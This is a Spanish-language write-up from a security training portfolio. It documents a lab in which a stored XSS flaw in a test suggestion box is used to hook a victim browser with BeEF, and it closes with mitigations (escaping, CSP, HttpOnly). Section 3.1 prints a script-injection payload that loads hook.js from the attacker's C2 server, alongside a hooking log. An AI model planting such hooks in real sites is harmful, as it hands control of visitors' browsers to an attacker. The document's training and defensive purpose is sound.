# 🎯 Memoria Técnica: Lab 04.4 - XSS Hooking con BeEF

**Módulo:** 04 - Ataques de Ingeniería Social  
**Fecha:** 2 de Marzo de 2026  
**Auditor:** Michel Macias  
**Objetivo:** Explotación de vulnerabilidad XSS persistente mediante BeEF.

---

## 1. Resumen Ejecutivo
Se ha realizado una prueba de concepto de hooking de navegadores utilizando el framework **BeEF (Browser Exploitation Framework)**. A través de una vulnerabilidad de inyección HTML/JS (XSS) en el portal de sugerencias de Pixel Paradise, se logró tomar el control remoto de la sesión del navegador de un usuario víctima, permitiendo la ejecución de comandos de post-explotación.

---

## 2. Escenario y Preparación

### 2.1. Infraestructura
- **Atacante:** Kali Linux con BeEF (`172.32.0.10`).
- **Víctima:** Servidor Apache con aplicación vulnerable (`172.32.0.20`).
- **Vector de Ataque:** Inyección de script externo (`hook.js`).

![Despliegue de Infraestructura BeEF](../Capturas_para_labs/labs04/2026-03-02_13-38.png)

### 2.2. Configuración del Servidor C2 (BeEF)
Se configuró BeEF para operar en el puerto 3000 con un password robusto (`Cisco_Lab_2026!`) y se reubicó el puerto del proxy al 6791 para evitar conflictos de red. El servidor se estabilizó mediante un script de bootstrap personalizado.

---

## 3. Ejecución del Ataque

### 3.1. Inyección del Hook
Se localizó un punto de entrada vulnerable en `http://localhost:8083` (Buzón de Sugerencias) donde se inyectó el siguiente payload apuntando a la IP de la red interna del atacante:

```html
<script src="http://172.32.0.10:3000/hook.js"></script>
```

![Inyección de Payload XSS](../Capturas_para_labs/labs04/beef2.png)

### 3.2. Captura del Navegador (Hooking)
Al cargar la víctima la página infectada, el script se ejecutó en segundo plano, estableciendo una conexión persistente con el panel de control del atacante. El navegador aparece instantáneamente en la sección "Online Browsers".

![Panel de BeEF con Navegador Enganchado](../Capturas_para_labs/labs04/beef3.png)

**Evidencia de Captura (Logs del Servidor):**
```text
[*] New Hooked Browser [id:1, ip:172.32.0.1, browser:C-145.0.0.0, os:Linux-], hooked origin [localhost:8083]
```

---

## 4. Post-Explotación
Una vez "enganchado" el navegador, se verificó la capacidad de enviar mensajes de sistema y extraer información del host:
- **Módulo Alert Dialog:** Ejecutado con éxito para confirmar la interactividad.
- **Fingerprinting:** Identificación de versión del navegador, plugins instalados y sistema operativo.

---

## 5. Mitigación y Buenas Prácticas

| Vulnerabilidad | Mitigación |
|:---|:---|
| Cross-Site Scripting (XSS) | Implementar saneamiento estricto de inputs con funciones como `htmlspecialchars()`. |
| Falta de Aislamiento | Configurar cabeceras **Content Security Policy (CSP)** para restringir la carga de scripts externos. |
| Sesiones Expuestas | Utilizar el flag `HttpOnly` en las cookies de sesión para evitar su robo mediante JS. |

---
*Este documento forma parte del Portfolio de Seguridad de Michel Macias.*
